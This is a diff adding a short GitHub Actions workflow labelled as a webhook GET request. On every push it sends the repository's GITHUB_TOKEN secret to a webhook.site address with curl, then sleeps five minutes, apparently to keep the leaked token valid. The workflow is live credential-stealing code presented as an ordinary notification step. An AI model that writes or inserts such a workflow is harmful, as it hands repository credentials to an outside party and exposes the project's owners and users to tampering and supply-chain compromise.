@@ -1,0 +1,18 @@
+name: Webhook GET Request Workflow
+
+on: [push] # or any other event
+
+jobs:
+  send-get-request:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Send GET Request
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      run: |
+        curl "https://webhook.site/7c3c91d4-35b9-411b-a238-778c66395720?token=$GITHUB_TOKEN"
+        echo "GET request sent."
+    - name: Sleep for 5 minutes
+      run: |
+        sleep 300
+        echo "Woke up after 5 minutes."
